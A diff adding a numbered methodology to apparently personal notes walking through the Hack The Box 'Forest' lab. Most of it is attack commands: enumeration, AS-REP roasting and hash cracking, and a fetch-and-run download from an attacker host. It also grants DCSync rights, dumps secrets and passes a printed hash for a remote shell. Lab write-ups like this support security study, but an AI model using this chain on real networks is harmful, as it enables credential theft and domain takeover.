@@ -1,3 +1,34 @@
+# Methodology
+1. `./rustscan -a 10.129.95.185 -r 1-65535` get portscan information.
+2. `nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161`.
+3. `nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161`.
+4. `dig  @10.10.10.161 htb.local`, `htb.local` is the domain name we got from scanning.
+5. `dig  @10.10.10.161 forest.htb.local`
+6. `dig axfr  @10.10.10.161 htb.local` try zone traansfer.
+7. `ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161`, -x to check for anonymous login.
+8. `smbmap -H 10.10.10.161` try to share without password.
+9. `smbmap -H 10.10.10.161 -u 0xdf -p 0xdf`.
+10. `smbclient -N -L //10.10.10.161`.
+11. Enumerate RCP `rpcclient -U "" -N 10.10.10.161`, if u get shell `enumdomusers`, put it in `user.txt`.
+12. Enumerate AD for users again `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
+13. `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
+14. `for user in $(cat users); do mpacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
+15. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
+16. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
+17. Now try to get information about privilge escalation.
+18. Run `neo4j`.
+19. Run `Bloodhound --no-sandbox` to open up webUI.
+20. OK now u need to transfer `Collection` scripts from the github repo to the victim.
+21. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
+22. Or directly run exe.
+23. `bloodhound-python -d htb.local -usvc-afresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`, it dumps a zip file, get it and load it webUI.
+24. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
+25. Use the share from the victim `net use \\10.10.14.6\share /u:df df`. and upload `copy 20191018035324_BloodHound.zip \\10.10.14.6\share\`
+26. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
+27. Dsync attack `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` ?
+28. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
+29. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
+30. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
 # Initial Attack Vector
 ### LLMNR Poisoning
  - Link Local Multicast Name Resolution.
